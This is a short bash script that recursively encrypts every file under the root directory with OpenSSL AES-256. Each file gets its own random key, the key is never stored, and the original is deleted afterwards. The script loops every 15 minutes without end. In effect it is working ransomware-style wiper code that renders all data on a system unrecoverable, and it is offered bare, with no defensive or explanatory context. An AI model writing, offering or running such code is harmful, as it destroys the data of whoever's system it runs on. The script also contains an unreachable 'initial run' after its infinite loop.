#!/bin/bash

inputDirectory="/"

# Function to encrypt directory
encrypt_directory() {
  files=$(ls "$1")

  for file in $files; do
    filePath="$1/$file"

    if [ -d "$filePath" ]; then
      # Recursively encrypt subdirectories
      encrypt_directory "$filePath"
    else
      # Encrypt files
      encrypt_file "$filePath"
    fi
  done
}

# Function to encrypt file
encrypt_file() {
  key=$(openssl rand -hex 32) # 256-bit key

  openssl enc -aes-256-cbc -salt -in "$1" -out "$1.enc" -pass pass:"$key" &>/dev/null

  if [ $? -eq 0 ]; then
    rm "$1"
  fi
}

# Function to encrypt directory and log success/error
encrypt_and_log() {
  encrypt_directory "$1"
  if [ $? -eq 0 ]; then
    echo "Directory encrypted successfully."
  else
    echo "Error encrypting directory."
  fi
}

# Run the encryption process every 15 minutes
while true; do
  encrypt_and_log "$inputDirectory"
  sleep 900 # 15 minutes in seconds
done

# Initial run
encrypt_and_log "$inputDirectory"
